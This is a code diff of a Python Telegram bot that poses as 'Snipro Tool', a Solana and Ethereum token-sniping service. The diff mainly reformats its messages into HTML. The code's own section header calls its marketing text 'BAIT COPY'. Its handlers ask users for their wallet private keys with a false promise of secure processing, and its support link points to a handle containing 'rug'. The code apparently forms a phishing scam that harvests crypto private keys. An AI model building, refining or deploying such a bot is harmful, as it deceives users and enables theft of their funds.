@@ -42,55 +42,55 @@ dp  = Dispatcher()
 # =========================================================
 # BAIT COPY
 # =========================================================
-START_COPY = """Welcome to Snipro Tool \u26a1\U0001f680
+START_COPY = """<b>Welcome to Snipro Tool</b> ⚡🚀
 
-Your Solana sniper bot built to find launches early and execute fast.
+Your professional Solana & Ethereum sniper bot built to find launches early and execute fast.
 
-\U0001f50e Spot it
-\U0001f4e1 Live token detection
-\U0001f4ca Smart market tracking
-\U0001f45b Wallet activity monitoring
+<b>🔎 Spot it</b>
+├ 📡 Live token detection
+├ 📊 Smart market tracking
+└ 👛 Wallet activity monitoring
 
-\U0001f6e1\ufe0f Screen it
-\U0001f36f Honeypot detection
-\U0001f4dc Contract analysis
-\U0001f525 LP burn & lock checks
-\U0001f40b Dev & top-holder tracking
+<b>🛡️ Screen it</b>
+├ 🍯 Honeypot detection
+├ 📜 Contract analysis
+├ 🔥 LP burn & lock checks
+└ 🐋 Dev & top-holder tracking
 
-\U0001f3af Filter it
-\U0001f4a7 Minimum liquidity
-\U0001f4c8 Market cap limits
-\u23f1\ufe0f Token age filters
-\u2696\ufe0f Buy/sell pressure
+<b>🎯 Filter it</b>
+├ 💧 Minimum liquidity
+├ 📈 Market cap limits
+├ ⏱️ Token age filters
+└ ⚖️ Buy/sell pressure
 
-\u26a1 Execute
-\U0001f680 Auto-buy on match
-\U0001f4b0 Auto-sell & take profit
-\U0001f6d1 Stop-loss protection
-\U0001f39b\ufe0f Priority fee control
+<b>⚡ Execute</b>
+├ 🚀 Auto-buy on match
+├ 💰 Auto-sell & take profit
+├ 🛑 Stop-loss protection
+└ 🎛️ Priority fee control
 
-Find it. Filter it. Snipe it. \u26a1"""
+<i>Find it. Filter it. Snipe it.</i> ⚡"""
 
-SETUP_COPY = """\U0001f4cb Snipro Tool Setup Guide \U0001f4cb
+SETUP_COPY = """📋 <b>Snipro Tool Setup Guide</b> 📋
 
 High-speed Sniper bot now on Solana & Ethereum.
 
-1. Import your Solana or Ethereum wallet
-2. Activate Snipro to start capturing opportunities
+<b>1.</b> Import your Solana or Ethereum wallet
+<b>2.</b> Activate Snipro to start capturing opportunities
 
-Status: \U0001f534 Not Active"""
+<b>Status:</b> 🔴 <i>Not Active</i>"""
 
 def main_menu_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\U0001f510 Import Solana Wallet",   callback_data="import_sol")],
-        [InlineKeyboardButton(text="\U0001f510 Import Ethereum Wallet", callback_data="import_eth")],
-        [InlineKeyboardButton(text="\U0001f680 Start Sniping",          callback_data="start_sniping")],
-        [InlineKeyboardButton(text="\U0001f4ac Support",                url="https://t.me/Mrsal_rug")],
+        [InlineKeyboardButton(text="🔐 Import Solana Wallet",   callback_data="import_sol")],
+        [InlineKeyboardButton(text="🔐 Import Ethereum Wallet", callback_data="import_eth")],
+        [InlineKeyboardButton(text="⚡ Start Sniping",          callback_data="start_sniping")],
+        [InlineKeyboardButton(text="💬 Support",                url="https://t.me/Mrsal_rug")],
     ])
 
 def back_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\u2b05\ufe0f Back", callback_data="back")],
+        [InlineKeyboardButton(text="⬅️ Back to Menu", callback_data="back")],
     ])
 
 awaiting_key = {}
@@ -316,17 +316,17 @@ async def on_start(message: Message):
     track("START", message.from_user.username or message.from_user.full_name, message.from_user.id)
     _save_stats()
     awaiting_key.pop(message.from_user.id, None)
-    await message.answer(START_COPY, reply_markup=main_menu_kb())
+    await message.answer(START_COPY, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
 
 @dp.callback_query(F.data == "back")
 async def on_back(cb: CallbackQuery):
     awaiting_key.pop(cb.from_user.id, None)
-    await cb.message.edit_text(START_COPY, reply_markup=main_menu_kb())
+    await cb.message.edit_text(START_COPY, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
     await cb.answer()
 
 @dp.callback_query(F.data == "start_sniping")
 async def on_start_sniping(cb: CallbackQuery):
-    await cb.message.edit_text(SETUP_COPY, reply_markup=main_menu_kb())
+    await cb.message.edit_text(SETUP_COPY, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
     await cb.answer()
 
 @dp.callback_query(F.data == "import_sol")
@@ -339,7 +339,7 @@ async def on_import_sol(cb: CallbackQuery):
         "\U0001f510 *Import Solana Wallet* \U0001f510\n\n"
         "Please provide your Solana private key (base58).\n"
         "It will be processed securely.",
-        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
+        parse_mode=ParseMode.HTML, reply_markup=back_kb())
     await cb.answer()
 
 @dp.callback_query(F.data == "import_eth")
@@ -352,7 +352,7 @@ async def on_import_eth(cb: CallbackQuery):
         "\U0001f510 *Import Ethereum Wallet* \U0001f510\n\n"
         "Please provide your Ethereum private key (hex, 0x... or without 0x).\n"
         "It will be processed securely.",
-        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
+        parse_mode=ParseMode.HTML, reply_markup=back_kb())
     await cb.answer()
 
 SOL_RE = re.compile(r"^[1-9A-HJ-NP-Za-km-z]{80,100}$")
